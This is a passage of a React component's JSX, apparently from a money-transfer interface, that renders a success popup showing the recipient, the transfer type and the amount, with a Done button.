              <div style={{ width: 64, height: 64, borderRadius: "50%", backgroundColor: "#dcfce7", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px" }}>
                <CheckCircle2 size={36} style={{ color: "#16a34a" }} />
              </div>
              <h3 style={{ margin: "0 0 4px", fontSize: 18, fontWeight: 700, color: "#111" }}>Transaction Successful!</h3>
              <p style={{ margin: "0 0 20px", fontSize: 13, color: "#666" }}>Your {successPopup.type.toLowerCase()} transfer has been completed.</p>
              <div style={{ backgroundColor: "#f8f9fa", borderRadius: 10, padding: "16px 20px", marginBottom: 24, textAlign: "left" }}>
                <div style={{ display: "flex", justifyContent: "space-between", padding: "5px 0", fontSize: 14 }}>
                  <span style={{ color: "#888" }}>Recipient</span>
                  <span style={{ fontWeight: 600, color: "#111" }}>{successPopup.recipient}</span>
                </div>
                <div style={{ display: "flex", justifyContent: "space-between", padding: "5px 0", fontSize: 14 }}>
                  <span style={{ color: "#888" }}>Type</span>
                  <span style={{ fontWeight: 600, color: "#111" }}>{successPopup.type}</span>
                </div>
                <div style={{ display: "flex", justifyContent: "space-between", padding: "5px 0", borderTop: "1px solid #eee", marginTop: 4, fontSize: 14 }}>
                  <span style={{ color: "#888" }}>Amount</span>
                  <span style={{ fontWeight: 700, color: "#16a34a", fontSize: 18 }}>${successPopup.amount.toLocaleString()}</span>
                </div>
              </div>
              <button
                onClick={() => setSuccessPopup(null)}
                style={{ width: "100%", padding: "12px", border: "none", borderRadius: 8, backgroundColor: "#426FB6", color: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 700 }}
              >
                Done
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
